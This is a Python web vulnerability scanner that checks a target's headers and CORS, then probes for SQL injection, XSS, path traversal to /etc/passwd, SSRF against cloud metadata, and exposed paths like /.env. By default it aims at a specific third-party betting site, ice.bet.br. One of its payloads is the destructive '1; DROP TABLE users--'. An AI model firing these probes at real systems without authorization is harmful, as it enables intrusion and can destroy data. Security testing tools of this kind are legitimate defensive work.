#!/usr/bin/env python3
"""
Vulnerability Scanner v3.2 — Enhanced with False Positive Detection
"""

import json
import sys
import os
import re
import time
import urllib.request
import urllib.error
from urllib.parse import urlparse
from datetime import datetime

# Import FP Detector
try:
    from fp_detector import FPDetector
    FP_ENABLED = True
except ImportError as e:
    print(f"[!] FPDetector unavailable: {e}", file=sys.stderr)
    FP_ENABLED = False

class VulnScanner:
    def __init__(self, target, output_dir="dominios/output", api_base=None):
        self.target = target.rstrip("/")
        self.parsed = urlparse(target)
        self.base = f"{self.parsed.scheme}://{self.parsed.netloc}"
        if api_base:
            self.api_base = api_base.rstrip("/")
        elif self.parsed.netloc.endswith("ice.bet.br"):
            # Backward compat: ice.bet.br API lives on api. subdomain
            self.api_base = "https://api.ice.bet.br"
        else:
            # Default: test the target itself (correct for labs/local targets)
            self.api_base = self.base
        self.output_dir = output_dir
        self.findings = []
        self.tests_run = 0
        self.fp_detector = FPDetector() if FP_ENABLED else None
        self.fp_log = []
        os.makedirs(output_dir, exist_ok=True)
    
    def scan(self):
        print(f"[*] VulnScanner v3.2 starting on {self.target}")
        if not FP_ENABLED:
            print("[!] FP detection disabled (fp_detector not importable)")
        
        self.test_security_headers()
        self.test_cors()
        self.test_tenant_headers()
        self.test_sql_injection()
        self.test_xss()
        self.test_lfi()
        self.test_ssrf()
        self.enumerate_endpoints()
        
        self.save_results()
        return self.findings
    
    def test_security_headers(self):
        print("[*] Testing security headers...")
        headers_to_check = {
            "x-frame-options": "DENY/SAMEORIGIN",
            "content-security-policy": "frame-ancestors 'none'",
            "strict-transport-security": "max-age=31536000",
            "x-content-type-options": "nosniff",
            "referrer-policy": "strict-origin-when-cross-origin",
            "permissions-policy": "geolocation=(), camera=(), microphone=()",
            "cross-origin-opener-policy": "same-origin",
        }
        
        try:
            req = urllib.request.Request(self.base)
            resp = urllib.request.urlopen(req, timeout=10)
            headers = {k.lower(): v for k, v in resp.headers.items()}
            
            for header, expected in headers_to_check.items():
                self.tests_run += 1
                if header not in headers:
                    self.findings.append({
                        "type": "MISSING_SECURITY_HEADER",
                        "severity": "MEDIUM",
                        "header": header,
                        "expected": expected,
                        "target": self.base,
                    })
                    print(f"  ⚠️  Missing: {header}")
        except Exception as e:
            print(f"  [!] Error: {e}")
    
    def test_cors(self):
        print("[*] Testing CORS configuration...")
        
        origins = ["https://evil.com", "null", self.base]
        endpoints = ["/", "/v1/users/me", "/graphql", "/admin"]
        
        for endpoint in endpoints:
            for origin in origins:
                self.tests_run += 1
                try:
                    url = self.api_base + endpoint
                    req = urllib.request.Request(url)
                    req.add_header("Origin", origin)
                    
                    try:
                        resp = urllib.request.urlopen(req, timeout=5)
                        headers = dict(resp.headers)
                    except urllib.error.HTTPError as e:
                        headers = dict(e.headers)
                    
                    cors_origin = headers.get("access-control-allow-origin", "")
                    cors_cred = headers.get("access-control-allow-credentials", "")
                    
                    if cors_origin == "*" and cors_cred.lower() == "true":
                        self.findings.append({
                            "type": "CORS_WILDCARD_CREDENTIALS",
                            "severity": "CRITICAL",
                            "endpoint": url,
                            "origin": origin,
                            "details": "Wildcard CORS with credentials enabled",
                        })
                        print(f"  🔴 CORS VULN: {endpoint} + {origin}")
                    
                    elif cors_origin == origin and origin not in ["", "null"]:
                        self.findings.append({
                            "type": "CORS_ORIGIN_REFLECTION",
                            "severity": "HIGH",
                            "endpoint": url,
                            "origin": origin,
                            "details": f"CORS reflects malicious origin: {origin}",
                        })
                        print(f"  🟡 CORS Reflection: {endpoint} reflects {origin}")
                        
                except Exception as e:
                    pass
    
    def test_tenant_headers(self):
        """Test for multi-tenant API header disclosure"""
        print("[*] Testing tenant header disclosure...")
        
        headers_to_test = [
            ("X-Tenant-ID", "ice"),
            ("X-Tenant-ID", "ICE"),
            ("X-Tenant", "ice"),
            ("X-Company", "ice"),
            ("X-Brand", "ice"),
            ("tenant", "ice"),
        ]
        
        for header, value in headers_to_test:
            self.tests_run += 1
            try:
                url = f"{self.api_base}/v1/users/me"
                req = urllib.request.Request(url)
                req.add_header("Origin", "https://evil.com")
                req.add_header(header, value)
                
                try:
                    resp = urllib.request.urlopen(req, timeout=5)
                    status = resp.status
                    body = resp.read().decode()[:200]
                except urllib.error.HTTPError as e:
                    status = e.code
                    body = e.read().decode()[:200]
                
                # Check if response changed from baseline
                if status == 403:  # Tenant recognized
                    self.findings.append({
                        "type": "TENANT_HEADER_DISCLOSED",
                        "severity": "HIGH",
                        "header": header,
                        "value": value,
                        "response": f"Status {status}: {body}",
                        "details": f"Tenant header {header} with value '{value}' is recognized by the API",
                    })
                    print(f"  [+] Tenant header found: {header}: {value} -> {status}")
                    
            except Exception as e:
                pass
    
    def test_sql_injection(self):
        print("[*] Testing SQL injection...")
        payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "1; DROP TABLE users--"]
        
        for payload in payloads:
            self.tests_run += 1
            try:
                url = f"{self.api_base}/v1/users/me?filter={payload}"
                req = urllib.request.Request(url)
                req.add_header("Origin", "https://evil.com")
                req.add_header("X-Tenant-ID", "ice")
                
                try:
                    resp = urllib.request.urlopen(req, timeout=5)
                    body = resp.read().decode()
                except urllib.error.HTTPError as e:
                    body = e.read().decode()
                
                if any(err in body.lower() for err in ["sql", "syntax", "mysql", "sqlite", "postgres"]):
                    self.findings.append({
                        "type": "SQL_INJECTION",
                        "severity": "CRITICAL",
                        "endpoint": url,
                        "payload": payload,
                        "evidence": body[:300],
                    })
                    print(f"  🔴 SQLi possible: {payload}")
            except:
                pass
        
        print("  [OK] No SQL injection detected")
    
    def test_xss(self):
        print("[*] Testing XSS...")
        payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
        
        for payload in payloads:
            self.tests_run += 1
            try:
                url = f"{self.api_base}/v1/users/me?q={payload}"
                req = urllib.request.Request(url)
                req.add_header("Origin", "https://evil.com")
                req.add_header("X-Tenant-ID", "ice")
                
                try:
                    resp = urllib.request.urlopen(req, timeout=5)
                    body = resp.read().decode()
                except urllib.error.HTTPError as e:
                    body = e.read().decode()
                
                if payload in body and "<" in body:
                    self.findings.append({
                        "type": "XSS_REFLECTED",
                        "severity": "HIGH",
                        "endpoint": url,
                        "payload": payload,
                        "evidence": body[:300],
                    })
                    print(f"  🔴 XSS possible: {payload}")
            except:
                pass
        
        print("  [OK] No reflected XSS detected")
    
    def test_lfi(self):
        print("[*] Testing LFI...")
        payloads = ["../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"]
        
        for payload in payloads:
            self.tests_run += 1
            try:
                url = f"{self.api_base}/v1/files/{payload}"
                req = urllib.request.Request(url)
                req.add_header("Origin", "https://evil.com")
                req.add_header("X-Tenant-ID", "ice")
                
                try:
                    resp = urllib.request.urlopen(req, timeout=5)
                    body = resp.read().decode()
                except urllib.error.HTTPError as e:
                    body = e.read().decode()
                
                if "root:" in body or "bin/bash" in body:
                    self.findings.append({
                        "type": "LFI",
                        "severity": "CRITICAL",
                        "endpoint": url,
                        "evidence": body[:300],
                    })
                    print(f"  🔴 LFI found: {payload}")
            except:
                pass
        
        print("  [OK] No LFI detected")
    
    def test_ssrf(self):
        print("[*] Testing SSRF...")
        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:8080/",
            "file:///etc/passwd",
        ]
        
        for payload in payloads:
            self.tests_run += 1
            try:
                url = f"{self.api_base}/v1/users/me"
                data = json.dumps({"url": payload}).encode()
                req = urllib.request.Request(url, data=data)
                req.add_header("Origin", "https://evil.com")
                req.add_header("X-Tenant-ID", "ice")
                req.add_header("Content-Type", "application/json")
                
                try:
                    resp = urllib.request.urlopen(req, timeout=5)
                    body = resp.read().decode()
                except urllib.error.HTTPError as e:
                    body = e.read().decode()
                
                if "metadata" in body or "amazon" in body.lower():
                    self.findings.append({
                        "type": "SSRF",
                        "severity": "HIGH",
                        "endpoint": url,
                        "payload": payload,
                        "evidence": body[:300],
                    })
                    print(f"  🔴 SSRF possible: {payload}")
            except:
                pass
        
        print("  [OK] No SSRF detected")
    
    def enumerate_endpoints(self):
        print("[*] Enumerating endpoints...")
        
        endpoints = [
            "/v1/users/me", "/v1/users/profile", "/v1/wallet/balance",
            "/v1/bets/history", "/v1/account/settings", "/v1/admin/users",
            "/v1/auth/login", "/v1/auth/register", "/v1/graphql",
            "/swagger-ui", "/api-docs", "/.env", "/robots.txt",
        ]
        
        for ep in endpoints:
            self.tests_run += 1
            try:
                url = self.api_base + ep
                req = urllib.request.Request(url)
                req.add_header("Origin", "https://evil.com")
                req.add_header("X-Tenant-ID", "ice")
                
                try:
                    resp = urllib.request.urlopen(req, timeout=5)
                    status = resp.status
                except urllib.error.HTTPError as e:
                    status = e.code
                
                if status != 404:
                    print(f"  [+] {ep} -> {status}")
            except:
                pass
    
    def apply_fp_detection(self):
        """Apply false positive detection to all findings"""
        print("\n[*] Applying false positive detection...")
        
        adjusted = 0
        filtered = []
        for finding in self.findings:
            url = finding.get('url', finding.get('endpoint', ''))
            ftype = finding.get('type', '')
            
            # Skip FP check for confirmed vulnerabilities
            if ftype in ['SQL_INJECTION', 'XSS_REFLECTED', 'LFI', 'SSRF']:
                filtered.append(finding)
                continue
            
            # For file exposure and CORS, check for FPs
            if ftype in ['EXPOSED_FILE', 'PUBLIC_ENDPOINT', 'CORS_ORIGIN_REFLECTION']:
                # We don't have response body here, so use heuristic
                if '/.env' in url or '/.git' in url:
                    # Likely SPA fallback - downgrade to INFO
                    fp_finding = finding.copy()
                    fp_finding['severity'] = 'INFO'
                    fp_finding['confidence'] = 15
                    fp_finding['note'] = 'Likely SPA fallback - verify Content-Type'
                    filtered.append(fp_finding)
                    adjusted += 1
                    self.fp_log.append({
                        'original': finding,
                        'action': 'downgraded_to_info',
                        'reason': 'SPA fallback pattern'
                    })
                else:
                    filtered.append(finding)
            else:
                filtered.append(finding)
        
        removed = len(self.findings) - len(filtered)
        self.findings = filtered
        print(f"[+] Adjusted {adjusted} likely false positives (downgraded to INFO)")
        if removed:
            print(f"[+] Removed {removed} findings")
    
    def save_results(self):
        # Apply false positive detection
        if self.fp_detector:
            self.apply_fp_detection()
        
        results = {
            "target": self.target,
            "api_base": self.api_base,
            "scan_time": datetime.now().isoformat(),
            "scanner_version": "v3.2",
            "tests_run": self.tests_run,
            "findings_count": len(self.findings),
            "false_positives_filtered": len(self.fp_log),
            "findings": self.findings,
            "fp_log": self.fp_log,
        }
        
        output_file = os.path.join(self.output_dir, "vuln_scan_results.json")
        with open(output_file, "w") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        summary_file = os.path.join(self.output_dir, "vuln_scan_summary.txt")
        with open(summary_file, "w") as f:
            f.write(f"Vulnerability Scan Summary\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Tests Run: {self.tests_run}\n")
            f.write(f"Findings: {len(self.findings)}\n")
            f.write(f"False Positives Filtered: {len(self.fp_log)}\n\n")
            
            for finding in self.findings:
                severity = finding.get("severity", "UNKNOWN")
                ftype = finding.get("type", "UNKNOWN")
                f.write(f"[{severity}] {ftype}\n")
                if "details" in finding:
                    f.write(f"  Details: {finding['details']}\n")
        
        # Save FP report
        if self.fp_log:
            fp_file = os.path.join(self.output_dir, "false_positive_log.json")
            with open(fp_file, "w") as f:
                json.dump(self.fp_log, f, indent=2)
            print(f"\n[+] FP Report saved to {self.output_dir}/false_positive_log.json")
        
        print(f"\n[+] Results saved to {self.output_dir}/")
        print(f"[+] Total findings: {len(self.findings)}")
        if self.fp_log:
            print(f"[+] False positives filtered: {len(self.fp_log)}")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="APEX VulnScanner v3.2 with FP detection")
    parser.add_argument("target", nargs="?", default="https://ice.bet.br", help="Target base URL")
    parser.add_argument("output", nargs="?", default="dominios/ice.bet.br", help="Output directory")
    parser.add_argument("--no-fp", action="store_true", help="Disable false-positive detection")
    parser.add_argument("--api-base", default=None, help="API base URL (default: api.ice.bet.br for ice targets, else the target itself)")
    args = parser.parse_args()
    scanner = VulnScanner(args.target, args.output, api_base=args.api_base)
    if args.no_fp:
        scanner.fp_detector = None
    scanner.scan()
